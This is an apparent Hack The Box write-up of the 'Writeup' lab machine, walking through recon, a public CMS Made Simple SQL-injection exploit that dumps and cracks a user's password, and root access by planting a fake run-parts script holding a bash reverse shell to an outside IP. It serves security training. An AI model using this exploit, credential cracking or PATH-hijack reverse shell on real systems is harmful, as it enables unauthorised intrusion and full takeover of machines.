---
title: "Hackthebox Writeup Walkthrough"
date: 2021-07-04 21.00 
categories: [Hackthebox, Linux]
tags: [abusing path variable,SQLi]
author: CEngover
image: /assets/img/posts/writeup/writeup.png
---
Hello everyone. In this article, I'm going to try to explain writeup box solution which is one of the free hackthebox machines.

## Reconnaissance
Let's start with enumeration process. I added machine's ip into my hosts file. If you want to add too, you can add ip with `sudo echo "10.10.10.138     writeup.htb" >> /etc/hosts` easly.

After this small step, let's do a nmap scanning.

```
cengover@kali:~/htb/writeup$ sudo nmap -sC -sV -oA nmap/writeup-open-ports 10.10.10.138
[sudo] password for cengover: 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-04 12:32 EDT
Nmap scan report for 10.10.10.138
Host is up (0.093s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 dd:53:10:70:0b:d0:47:0a:e2:7e:4a:b6:42:98:23:c7 (RSA)
|   256 37:2e:14:68:ae:b9:c2:34:2b:6e:d9:92:bc:bf:bd:28 (ECDSA)
|_  256 93:ea:a8:40:42:c1:a8:33:85:b3:56:00:62:1c:a0:ab (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
| http-robots.txt: 1 disallowed entry 
|_/writeup/
|_http-title: Nothing here yet.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

As seen in the above, we have 2 ports open. They're running ssh and http services. We cannot do directory fuzzing because the machine is banning us for a while. Let's continue with manuel enumeration. We can check that is there a `robots.txt, admin.php, login.php` etc. We can get some information by visiting robots.txt file and it says that there is also folder named `/writeup`.

```bash
#              __
#      _(\    |@@|
#     (__/\__ \--/ __
#        \___|----|  |   __
#            \ }{ /\ )_ / _\
#            /\__/\ \__O (__
#           (--/\--)    \__/
#           _)(  )(_
#          `---''---`

# Disallow access to the blog until content is finished.
User-agent: * 
Disallow: /writeup/
```

![Writeup index page](/assets/img/posts/writeup/writeup_index.png)

After checking source code of the index page, we found that this page was built by CMS Made Simple. 

```bash
<meta name="Generator" content="CMS Made Simple - Copyright (C) 2004-2019. All rights reserved." />
```

## Getting Initial Access

We can try to search a exploit that belongs to this cms. After a little bit searching, I found  a sqli exploit. Once we run this exploit, we'll get following informations.

```bash
cengover@kali:~/htb/writeup$ python3 46635.py -u http://writeup.htb/writeup/ --crack -w /usr/share/wordlists/rockyou.txt
[+] Salt for password found: 5a599ef579066807  
[+] Username found: jkr  
[+] Email found: jkr@writeup.htb  
[+] Password found: 62def4866937f08cc13bab43bb14e6f7  
[+] Password cracked: raykayjay9
```

After cracking the password, we can get initial access with this creds.

![Getting User](/assets/img/posts/writeup/getting_user.png)

I ran pspy tool for monitoring the processes. I saw that after every succesfull login the following commands are running.

```bash
2021/07/04 13:47:12 CMD: UID=0    PID=24398  | sshd: [accepted]
2021/07/04 13:47:12 CMD: UID=0    PID=24399  | sshd: [accepted]  
2021/07/04 13:47:24 CMD: UID=0    PID=24400  | sshd: jkr [priv]  
2021/07/04 13:47:24 CMD: UID=0    PID=24401  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new 
2021/07/04 13:47:24 CMD: UID=0    PID=24402  | run-parts --lsbsysinit /etc/update-motd.d 
2021/07/04 13:47:24 CMD: UID=0    PID=24403  | uname -rnsom 
2021/07/04 13:47:24 CMD: UID=0    PID=24404  | sshd: jkr [priv]  
```

Let's see where run-parts command is located.

```bash
jkr@writeup:~$ which run-parts
/bin/run-parts
```
## Privilege Escalation

It's in `bin` folder so the folder is last folder in path search order which means if we can inject a custom run-parts command one of these path, our command can be triggered. Let's see what we can do. First of all, check these paths permissions.

```bash
jkr@writeup:~$ ls -ld /usr/local/sbin /usr/local/bin /usr/sbin /usr/bin /sbin /bin
drwxr-xr-x 2 root root   4096 Apr 19  2019 /bin
drwxr-xr-x 2 root root   4096 Aug 23  2019 /sbin
drwxr-xr-x 2 root root  20480 Aug 23  2019 /usr/bin
drwx-wsr-x 2 root staff 20480 Apr 19  2019 /usr/local/bin
drwx-wsr-x 2 root staff 12288 Apr 19  2019 /usr/local/sbin
drwxr-xr-x 2 root root   4096 Aug 23  2019 /usr/sbin
jkr@writeup:~$ id
uid=1000(jkr) gid=1000(jkr) groups=1000(jkr),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),50(staff),103(netdev)
jkr@writeup:~$ 
```

As seen in the above `jkr` is member of staff group and this group has privileges on `/usr/local/bin` and `/usr/local/sbin` directories. We can create a reverse shell named run-parts and put it to one of these directories. 

```bash
jkr@writeup:/usr/local/bin$ nano run-parts
jkr@writeup:/usr/local/bin$ cat run-parts
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.173/8080 0>&1
jkr@writeup:/usr/local/bin$ chmod +x run-parts
jkr@writeup:/usr/local/bin$ which run-parts
/usr/local/bin/run-parts

```


![Getting Root](/assets/img/posts/writeup/getting_root.png)

Firstly, we need to set a listener by running this command `nc -lvnp 8080`. After creating new ssh session, we have to get a root shell on the box.

